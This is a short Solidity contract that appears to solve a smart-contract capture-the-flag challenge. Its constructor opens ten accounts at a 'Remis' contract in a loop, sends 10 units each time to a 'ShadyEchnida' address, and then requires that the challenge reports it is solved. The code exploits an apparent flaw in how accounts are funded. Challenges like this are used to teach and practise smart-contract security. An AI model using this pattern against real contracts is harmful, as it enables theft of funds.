import "./Setup.sol";

contract Solve {

    constructor (Setup setup) {
        Remis remis = setup.remis();
        ShadyEchnida shady = setup.shady();

        for (int i=0; i<10; i++) {
            remis.openAccount();
            remis.sendMoney(10, address(shady));
        }

        require(setup.isSolved() == true);

        // emit Dialogue(setup.isSolved() ? "true" : "false"); // Should print true
    }
}